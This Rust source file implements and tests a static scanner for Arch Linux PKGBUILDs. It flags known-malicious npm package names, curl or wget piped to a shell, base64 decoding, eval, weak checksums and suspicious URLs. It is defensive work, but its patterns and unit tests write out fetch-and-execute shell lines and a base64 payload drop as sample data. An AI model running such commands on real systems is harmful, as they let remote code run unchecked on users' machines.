// SPDX-License-Identifier: GPL-3.0-or-later

use wardend_proto::{Finding, Severity};

/// Analyse the text of a PKGBUILD and return a list of findings.
///
/// This function is pure: no I/O, no network. Callers supply the PKGBUILD text
/// (from an AUR fetch or a test fixture). Core derives the module status from
/// the highest finding severity — this function never asserts a status.
pub fn analyze(pkgbuild: &str) -> Vec<Finding> {
    let mut findings = Vec::new();

    check_atomic_arch_iocs(&mut findings, pkgbuild);
    check_curl_pipe_shell(&mut findings, pkgbuild);
    check_package_managers(&mut findings, pkgbuild);
    check_base64_decode(&mut findings, pkgbuild);
    check_eval(&mut findings, pkgbuild);
    check_checksums(&mut findings, pkgbuild);
    check_suspicious_urls(&mut findings, pkgbuild);

    findings
}

// ── Rule: Atomic Arch supply-chain IOCs ──────────────────────────────────────

fn check_atomic_arch_iocs(findings: &mut Vec<Finding>, pkgbuild: &str) {
    if contains_token(pkgbuild, "atomic-lockfile") {
        findings.push(Finding {
            severity: Severity::Critical,
            title: "Atomic Arch IOC: atomic-lockfile".to_string(),
            detail: "The PKGBUILD references 'atomic-lockfile', a known-malicious npm package \
                     used in the June 2026 Atomic Arch AUR supply-chain attack. Installing this \
                     package would execute attacker-controlled code at npm install time."
                .to_string(),
            remediation:
                "Do not install this package. Flag it on the AUR and report to the Arch security \
                 team. See https://wardend.dev/advisories/atomic-arch-2026."
                    .to_string(),
        });
    }

    if contains_token(pkgbuild, "js-digest") {
        findings.push(Finding {
            severity: Severity::Critical,
            title: "Atomic Arch IOC: js-digest".to_string(),
            detail: "The PKGBUILD references 'js-digest', a known-malicious npm package used \
                     in the June 2026 Atomic Arch AUR supply-chain attack."
                .to_string(),
            remediation:
                "Do not install this package. Flag it on the AUR and report to the Arch security \
                 team."
                    .to_string(),
        });
    }
}

// ── Rule: curl / wget piped to a shell ───────────────────────────────────────

fn check_curl_pipe_shell(findings: &mut Vec<Finding>, pkgbuild: &str) {
    for line in pkgbuild.lines() {
        let l = line.trim();
        if l.starts_with('#') {
            continue;
        }

        let fetches = l.contains("curl ") || l.contains("wget ");
        let pipes_to_shell =
            l.contains("| bash") || l.contains("| sh") || l.contains("|bash") || l.contains("|sh");

        if fetches && pipes_to_shell {
            findings.push(Finding {
                severity: Severity::Critical,
                title: "Remote code execution: curl/wget piped to shell".to_string(),
                detail: format!(
                    "The PKGBUILD downloads and immediately executes a script from the network: \
                     `{l}`. This allows a remote server to run arbitrary code on the installing \
                     user's machine."
                ),
                remediation:
                    "Place the script in the source=() array with a sha256sum, or remove the \
                     dynamic download entirely."
                        .to_string(),
            });
            return; // one finding per PKGBUILD is enough; don't flood
        }

        // Process-substitution variant: bash <(curl ...) or sh <(wget ...)
        let proc_sub = (l.contains("bash <(") || l.contains("sh <("))
            && (l.contains("curl ") || l.contains("wget "));
        if proc_sub {
            findings.push(Finding {
                severity: Severity::Critical,
                title: "Remote code execution: process-substitution download".to_string(),
                detail: format!(
                    "The PKGBUILD executes a remotely-fetched script via process substitution: \
                     `{l}`."
                ),
                remediation: "Place the script in the source=() array with a sha256sum instead."
                    .to_string(),
            });
            return;
        }
    }
}

// ── Rule: package manager invocations ────────────────────────────────────────

fn check_package_managers(findings: &mut Vec<Finding>, pkgbuild: &str) {
    // npm is treated as High because it's the primary attack vector (Atomic Arch).
    let npm_triggers = ["npm install", "npm ci", "npm add", "npm run"];
    if npm_triggers.iter().any(|p| pkgbuild.contains(p)) {
        findings.push(Finding {
            severity: Severity::High,
            title: "npm invocation in PKGBUILD".to_string(),
            detail: "The PKGBUILD runs an npm command, which fetches packages from the npm \
                     registry at install time. npm packages are not reviewed by Arch maintainers \
                     and can contain malicious post-install hooks."
                .to_string(),
            remediation:
                "Vendor the npm dependencies into the source tarball, or use a lock-file with \
                 verified checksums."
                    .to_string(),
        });
    }

    let pip_triggers = ["pip install", "pip3 install"];
    if pip_triggers.iter().any(|p| pkgbuild.contains(p)) {
        findings.push(Finding {
            severity: Severity::High,
            title: "pip invocation in PKGBUILD".to_string(),
            detail: "The PKGBUILD runs pip/pip3 install, fetching Python packages from PyPI \
                     at build/install time without Arch-level review."
                .to_string(),
            remediation: "Use python-build / python-installer from the source tarball, or vendor \
                 dependencies."
                .to_string(),
        });
    }

    if pkgbuild.contains("gem install") {
        findings.push(Finding {
            severity: Severity::High,
            title: "gem invocation in PKGBUILD".to_string(),
            detail: "The PKGBUILD runs gem install, fetching Ruby gems from RubyGems.org at \
                     build/install time without Arch-level review."
                .to_string(),
            remediation: "Vendor gem dependencies or build from the source tarball.".to_string(),
        });
    }

    let bun_triggers = ["bun install", "bun add"];
    if bun_triggers.iter().any(|p| pkgbuild.contains(p)) {
        findings.push(Finding {
            severity: Severity::High,
            title: "bun invocation in PKGBUILD".to_string(),
            detail: "The PKGBUILD runs bun install/add, fetching packages from the npm registry \
                     at build/install time without Arch-level review."
                .to_string(),
            remediation: "Vendor bun dependencies or use a lock-file with verified checksums."
                .to_string(),
        });
    }
}

// ── Rule: base64 decode ───────────────────────────────────────────────────────

fn check_base64_decode(findings: &mut Vec<Finding>, pkgbuild: &str) {
    let triggers = ["base64 -d", "base64 --decode"];
    if triggers.iter().any(|p| pkgbuild.contains(p)) {
        findings.push(Finding {
            severity: Severity::High,
            title: "base64 decode in PKGBUILD".to_string(),
            detail: "The PKGBUILD decodes base64 content at build/install time. This is a \
                     common technique to obfuscate a dropped payload from static analysis."
                .to_string(),
            remediation:
                "Audit the base64-encoded content. If it is a legitimate embedded resource, \
                 include it as a named source with a checksum instead."
                    .to_string(),
        });
    }
}

// ── Rule: eval ───────────────────────────────────────────────────────────────

fn check_eval(findings: &mut Vec<Finding>, pkgbuild: &str) {
    for line in pkgbuild.lines() {
        let l = line.trim();
        if l.starts_with('#') {
            continue;
        }
        // Match `eval ` or `eval"` or `eval'` but not the word "evaluation" etc.
        if l.starts_with("eval ")
            || l.starts_with("eval\"")
            || l.starts_with("eval'")
            || l.contains(" eval ")
            || l.contains("\teval ")
        {
            findings.push(Finding {
                severity: Severity::High,
                title: "eval in PKGBUILD".to_string(),
                detail: format!(
                    "The PKGBUILD uses eval to execute dynamically-constructed code: `{l}`. \
                     eval can be used to hide malicious payloads from static analysis."
                ),
                remediation: "Replace eval with explicit, auditable commands. If eval is used for \
                     command substitution, rewrite using explicit variable expansion."
                    .to_string(),
            });
            return; // one finding per PKGBUILD
        }
    }
}

// ── Rule: weak or missing checksums ──────────────────────────────────────────

fn check_checksums(findings: &mut Vec<Finding>, pkgbuild: &str) {
    // SKIP in any checksum array: the source is not verified.
    // Exception: SKIP is legitimate for PGP signature files when validpgpkeys= is present,
    // because makepkg verifies those via GPG rather than a hash.
    let checksum_arrays = ["sha256sums", "sha512sums", "b2sums", "md5sums", "sha1sums"];
    let has_validpgpkeys = pkgbuild.contains("validpgpkeys=");

    for array in checksum_arrays {
        let pattern_sq = format!("{array}=");
        if pkgbuild.contains(&pattern_sq)
            && (pkgbuild.contains("'SKIP'") || pkgbuild.contains("\"SKIP\""))
            && !has_validpgpkeys
        {
            findings.push(Finding {
                severity: Severity::Medium,
                title: "Checksum SKIP in PKGBUILD".to_string(),
                detail: "One or more sources use 'SKIP' as a checksum, meaning the \
                         downloaded file is not integrity-checked. A compromised mirror \
                         could serve a modified tarball without detection."
                    .to_string(),
                remediation: "Replace 'SKIP' with the actual sha256sum. Use `makepkg -g` to \
                     generate checksums."
                    .to_string(),
            });
            break;
        }
    }

    // md5sums or sha1sums: cryptographically weak
    if pkgbuild.contains("md5sums=") {
        findings.push(Finding {
            severity: Severity::Medium,
            title: "Weak checksum algorithm: md5".to_string(),
            detail: "The PKGBUILD uses MD5 checksums. MD5 is cryptographically broken and \
                     vulnerable to collision attacks, meaning a malicious tarball could be \
                     crafted with the same checksum."
                .to_string(),
            remediation: "Switch to sha256sums or b2sums.".to_string(),
        });
    } else if pkgbuild.contains("sha1sums=") {
        findings.push(Finding {
            severity: Severity::Medium,
            title: "Weak checksum algorithm: sha1".to_string(),
            detail: "The PKGBUILD uses SHA-1 checksums. SHA-1 is deprecated and vulnerable to \
                     chosen-prefix collision attacks."
                .to_string(),
            remediation: "Switch to sha256sums or b2sums.".to_string(),
        });
    }

    // Source array present with no checksum array at all
    if pkgbuild.contains("source=(") || pkgbuild.contains("source =(") {
        let has_any_checksums = checksum_arrays
            .iter()
            .any(|a| pkgbuild.contains(&format!("{a}=")));
        if !has_any_checksums {
            findings.push(Finding {
                severity: Severity::Medium,
                title: "Missing checksum array in PKGBUILD".to_string(),
                detail: "The PKGBUILD declares a source=() array but has no checksum array \
                         (sha256sums, b2sums, etc.). Downloaded sources are not integrity-checked."
                    .to_string(),
                remediation: "Add sha256sums=() entries. Use `makepkg -g` to generate them."
                    .to_string(),
            });
        }
    }
}

// ── Rule: suspicious URLs ─────────────────────────────────────────────────────

/// Flags URLs containing bare IP addresses or known-suspicious TLDs.
///
/// Two-pass approach: IP addresses (High) are checked across all lines first so a
/// suspicious-TLD match on an earlier line cannot suppress an IP-address match later.
fn check_suspicious_urls(findings: &mut Vec<Finding>, pkgbuild: &str) {
    let non_comment_lines: Vec<&str> = pkgbuild
        .lines()
        .map(str::trim)
        .filter(|l| !l.starts_with('#'))
        .collect();

    // Pass 1: bare IP addresses (High)
    for l in &non_comment_lines {
        if let Some(url_start) = find_url_start(l) {
            let after_scheme = &l[url_start..];
            if is_ip_address_host(after_scheme) {
                findings.push(Finding {
                    severity: Severity::High,
                    title: "URL with bare IP address".to_string(),
                    detail: format!(
                        "The PKGBUILD uses a URL with a bare IP address: `{l}`. Legitimate \
                         package sources use named domains. This may indicate an attacker-controlled \
                         server."
                    ),
                    remediation:
                        "Replace the IP-addressed URL with a named domain, or remove the source \
                         entirely."
                            .to_string(),
                });
                return; // one High finding is enough — don't also emit Medium for same PKGBUILD
            }
        }
    }

    // Pass 2: suspicious TLDs (Medium) — only reached if no IP-address match
    for l in &non_comment_lines {
        if let Some(url_start) = find_url_start(l) {
            let after_scheme = &l[url_start..];
            if has_suspicious_tld(after_scheme) {
                findings.push(Finding {
                    severity: Severity::Medium,
                    title: "URL with suspicious TLD".to_string(),
                    detail: format!(
                        "The PKGBUILD sources from a URL with a TLD commonly used for malicious \
                         infrastructure: `{l}`."
                    ),
                    remediation: "Verify the legitimacy of this domain and consider using a \
                                  more established mirror."
                        .to_string(),
                });
                return;
            }
        }
    }
}

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Returns true if the text contains the given token as a word-boundary match
/// (preceded/followed by a non-alphanumeric character or start/end of text).
fn contains_token(text: &str, token: &str) -> bool {
    let mut start = 0;
    while let Some(pos) = text[start..].find(token) {
        let abs = start + pos;
        let before_ok = abs == 0
            || !text
                .as_bytes()
                .get(abs - 1)
                .copied()
                .is_some_and(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_');
        let after_ok = abs + token.len() >= text.len()
            || !text
                .as_bytes()
                .get(abs + token.len())
                .copied()
                .is_some_and(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_');
        if before_ok && after_ok {
            return true;
        }
        start = abs + 1;
    }
    false
}

/// Returns the byte offset in `line` where a URL scheme (`http://` or `https://`) starts,
/// if one is present.
fn find_url_start(line: &str) -> Option<usize> {
    if let Some(pos) = line.find("https://") {
        return Some(pos + "https://".len());
    }
    if let Some(pos) = line.find("http://") {
        return Some(pos + "http://".len());
    }
    None
}

/// Returns true if the host portion of `after_scheme` (up to the first `/` or whitespace)
/// looks like an IPv4 address.
fn is_ip_address_host(after_scheme: &str) -> bool {
    let host = after_scheme
        .split(['/', ' ', '\t', '"', '\''])
        .next()
        .unwrap_or("");
    // Rough IPv4 match: four groups of digits separated by dots.
    let parts: Vec<&str> = host.split('.').collect();
    parts.len() == 4
        && parts
            .iter()
            .all(|p| !p.is_empty() && p.chars().all(|c| c.is_ascii_digit()))
}

/// Returns true if the host in `after_scheme` uses a TLD associated with
/// free/throwaway domains commonly abused in malicious campaigns.
fn has_suspicious_tld(after_scheme: &str) -> bool {
    const SUSPICIOUS_TLDS: &[&str] = &[
        ".xyz", ".top", ".tk", ".ml", ".ga", ".cf", ".gq", ".click", ".pw",
    ];
    let host = after_scheme
        .split(['/', ' ', '\t', '"', '\''])
        .next()
        .unwrap_or("");
    SUSPICIOUS_TLDS.iter().any(|tld| host.ends_with(tld))
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use wardend_proto::Severity;

    // Fixtures loaded at compile time — path relative to this file (src/)
    const MALICIOUS_ATOMIC_ARCH: &str =
        include_str!("../tests/fixtures/malicious_atomic_arch.pkgbuild");
    const MALICIOUS_CURL_PIPE: &str =
        include_str!("../tests/fixtures/malicious_curl_pipe.pkgbuild");
    const MALICIOUS_BASE64_EVAL: &str =
        include_str!("../tests/fixtures/malicious_base64_eval.pkgbuild");
    const MALICIOUS_NPM_PIP: &str = include_str!("../tests/fixtures/malicious_npm_pip.pkgbuild");
    const MALICIOUS_WEAK_CHECKSUMS: &str =
        include_str!("../tests/fixtures/malicious_weak_checksums.pkgbuild");
    const MALICIOUS_SUSPICIOUS_DOMAIN: &str =
        include_str!("../tests/fixtures/malicious_suspicious_domain.pkgbuild");
    const CLEAN_PACKAGE: &str = include_str!("../tests/fixtures/clean_package.pkgbuild");

    fn max_severity(findings: &[Finding]) -> Option<&Severity> {
        findings.iter().map(|f| &f.severity).max()
    }

    // ── Atomic Arch (flagship acceptance criterion) ────────────────────────

    #[test]
    fn atomic_arch_pattern_produces_critical_finding() {
        let findings = analyze(MALICIOUS_ATOMIC_ARCH);
        assert!(
            !findings.is_empty(),
            "expected findings for Atomic Arch PKGBUILD"
        );
        assert_eq!(
            max_severity(&findings),
            Some(&Severity::Critical),
            "Atomic Arch IOC must produce a Critical finding; got: {findings:?}"
        );
    }

    #[test]
    fn atomic_arch_atomic_lockfile_is_flagged() {
        let findings = analyze(MALICIOUS_ATOMIC_ARCH);
        let has_ioc = findings
            .iter()
            .any(|f| f.title.contains("atomic-lockfile") || f.detail.contains("atomic-lockfile"));
        assert!(
            has_ioc,
            "expected a finding that names atomic-lockfile; got: {findings:?}"
        );
    }

    #[test]
    fn atomic_arch_js_digest_is_flagged() {
        let pkgbuild = "npm install js-digest\n";
        let findings = analyze(pkgbuild);
        let has_ioc = findings
            .iter()
            .any(|f| f.title.contains("js-digest") || f.detail.contains("js-digest"));
        assert!(
            has_ioc,
            "expected a finding that names js-digest; got: {findings:?}"
        );
    }

    // ── curl-pipe-shell ───────────────────────────────────────────────────

    #[test]
    fn curl_pipe_shell_produces_critical() {
        let findings = analyze(MALICIOUS_CURL_PIPE);
        assert!(
            !findings.is_empty(),
            "expected findings for curl-pipe PKGBUILD"
        );
        assert_eq!(
            max_severity(&findings),
            Some(&Severity::Critical),
            "curl-pipe-shell must produce Critical; got: {findings:?}"
        );
    }

    #[test]
    fn wget_pipe_shell_produces_critical() {
        let pkgbuild = "build() {\n    wget -qO- https://example.com/setup.sh | sh\n}\n";
        let findings = analyze(pkgbuild);
        assert_eq!(
            max_severity(&findings),
            Some(&Severity::Critical),
            "wget-pipe-sh must produce Critical; got: {findings:?}"
        );
    }

    #[test]
    fn bash_process_substitution_produces_critical() {
        let pkgbuild = "build() {\n    bash <(curl -fsSL https://example.com/install.sh)\n}\n";
        let findings = analyze(pkgbuild);
        assert_eq!(
            max_severity(&findings),
            Some(&Severity::Critical),
            "process-substitution download must produce Critical; got: {findings:?}"
        );
    }

    // ── Package managers ──────────────────────────────────────────────────

    #[test]
    fn npm_and_pip_produce_high_findings() {
        let findings = analyze(MALICIOUS_NPM_PIP);
        assert!(!findings.is_empty());
        assert!(
            max_severity(&findings) >= Some(&Severity::High),
            "npm/pip must produce at least High; got: {findings:?}"
        );
        let has_npm = findings.iter().any(|f| f.title.contains("npm"));
        let has_pip = findings.iter().any(|f| f.title.contains("pip"));
        assert!(has_npm, "expected npm finding; got: {findings:?}");
        assert!(has_pip, "expected pip finding; got: {findings:?}");
    }

    #[test]
    fn gem_install_produces_high_finding() {
        let pkgbuild = "package() {\n    gem install bundler\n}\n";
        let findings = analyze(pkgbuild);
        let has_gem = findings.iter().any(|f| f.title.contains("gem"));
        assert!(has_gem, "expected gem finding; got: {findings:?}");
        assert!(max_severity(&findings) >= Some(&Severity::High));
    }

    #[test]
    fn bun_install_produces_high_finding() {
        let pkgbuild = "build() {\n    bun install\n}\n";
        let findings = analyze(pkgbuild);
        let has_bun = findings.iter().any(|f| f.title.contains("bun"));
        assert!(has_bun, "expected bun finding; got: {findings:?}");
        assert!(max_severity(&findings) >= Some(&Severity::High));
    }

    // ── base64 decode ─────────────────────────────────────────────────────

    #[test]
    fn base64_eval_produces_high_finding() {
        let findings = analyze(MALICIOUS_BASE64_EVAL);
        assert!(!findings.is_empty());
        assert!(
            max_severity(&findings) >= Some(&Severity::High),
            "base64/eval must produce at least High; got: {findings:?}"
        );
    }

    #[test]
    fn base64_decode_alone_produces_high() {
        let pkgbuild = "package() {\n    echo 'aGVsbG8=' | base64 -d > /tmp/payload\n}\n";
        let findings = analyze(pkgbuild);
        assert!(
            max_severity(&findings) >= Some(&Severity::High),
            "base64 -d must produce High; got: {findings:?}"
        );
    }

    #[test]
    fn base64_long_flag_produces_high() {
        let pkgbuild = "package() {\n    echo 'aGVsbG8=' | base64 --decode > /tmp/payload\n}\n";
        let findings = analyze(pkgbuild);
        assert!(
            max_severity(&findings) >= Some(&Severity::High),
            "base64 --decode must produce High; got: {findings:?}"
        );
    }

    // ── eval ──────────────────────────────────────────────────────────────

    #[test]
    fn eval_produces_high_finding() {
        let pkgbuild = "package() {\n    eval \"$(get_secret)\"\n}\n";
        let findings = analyze(pkgbuild);
        assert!(
            max_severity(&findings) >= Some(&Severity::High),
            "eval must produce High; got: {findings:?}"
        );
    }

    // ── checksums ─────────────────────────────────────────────────────────

    #[test]
    fn skip_checksum_produces_medium_finding() {
        let findings = analyze(MALICIOUS_WEAK_CHECKSUMS);
        assert!(
            !findings.is_empty(),
            "expected findings for weak-checksum PKGBUILD"
        );
        let has_skip = findings
            .iter()
            .any(|f| f.title.contains("SKIP") || f.detail.contains("SKIP"));
        assert!(
            has_skip,
            "expected a SKIP-checksum finding; got: {findings:?}"
        );
    }

    #[test]
    fn md5sums_produces_medium_finding() {
        let findings = analyze(MALICIOUS_WEAK_CHECKSUMS);
        let has_md5 = findings.iter().any(|f| f.title.contains("md5"));
        assert!(has_md5, "expected an md5sums finding; got: {findings:?}");
    }

    #[test]
    fn sha256sums_skip_alone_is_flagged() {
        let pkgbuild = "source=('https://example.com/pkg.tar.gz')\nsha256sums=('SKIP')\n";
        let findings = analyze(pkgbuild);
        let has_skip = findings.iter().any(|f| f.title.contains("SKIP"));
        assert!(
            has_skip,
            "sha256sums=('SKIP') must be flagged; got: {findings:?}"
        );
    }

    #[test]
    fn missing_checksum_array_is_flagged() {
        let pkgbuild = "source=('https://example.com/pkg.tar.gz')\n\nbuild() { make; }\n";
        let findings = analyze(pkgbuild);
        let has_missing = findings
            .iter()
            .any(|f| f.title.contains("Missing checksum"));
        assert!(
            has_missing,
            "source without checksums must produce a finding; got: {findings:?}"
        );
    }

    // ── suspicious URLs ───────────────────────────────────────────────────

    #[test]
    fn suspicious_domain_produces_finding() {
        let findings = analyze(MALICIOUS_SUSPICIOUS_DOMAIN);
        assert!(
            !findings.is_empty(),
            "expected findings for suspicious-domain PKGBUILD"
        );
    }

    #[test]
    fn ip_address_url_produces_high_finding() {
        let findings = analyze(MALICIOUS_SUSPICIOUS_DOMAIN);
        let has_ip = findings
            .iter()
            .any(|f| f.title.contains("IP address") || f.severity == Severity::High);
        assert!(
            has_ip,
            "IP address URL must produce High finding; got: {findings:?}"
        );
    }

    #[test]
    fn suspicious_tld_produces_medium_finding() {
        let pkgbuild = "source=('https://dl.evil-malware.xyz/pkg.tar.gz')\nsha256sums=('abc123')\n";
        let findings = analyze(pkgbuild);
        let has_tld = findings.iter().any(|f| f.title.contains("TLD"));
        assert!(
            has_tld,
            ".xyz TLD must produce a TLD finding; got: {findings:?}"
        );
    }

    // ── clean package ─────────────────────────────────────────────────────

    #[test]
    fn clean_package_produces_no_findings() {
        let findings = analyze(CLEAN_PACKAGE);
        assert!(
            findings.is_empty(),
            "clean PKGBUILD must produce no findings; got: {findings:?}"
        );
    }

    // ── helper unit tests ─────────────────────────────────────────────────

    #[test]
    fn contains_token_matches_word_boundaries() {
        assert!(contains_token(
            "npm install atomic-lockfile",
            "atomic-lockfile"
        ));
        assert!(contains_token("atomic-lockfile", "atomic-lockfile"));
        // should not match inside a longer token
        assert!(!contains_token("atomic-lockfile-extra", "atomic-lockfile"));
        assert!(contains_token(
            "npm install atomic-lockfile --save",
            "atomic-lockfile"
        ));
    }

    #[test]
    fn is_ip_address_host_detects_ipv4() {
        assert!(is_ip_address_host("192.168.1.1/path"));
        assert!(is_ip_address_host("10.0.0.1"));
        assert!(!is_ip_address_host("github.com/user/repo"));
        assert!(!is_ip_address_host("192.168.not.ip"));
    }

    #[test]
    fn has_suspicious_tld_detects_abused_tlds() {
        assert!(has_suspicious_tld("evil.xyz/file.tar.gz"));
        assert!(has_suspicious_tld("badstuff.top/file"));
        assert!(!has_suspicious_tld("github.com/user/repo"));
        assert!(!has_suspicious_tld("kernel.org/pub/linux"));
    }
}
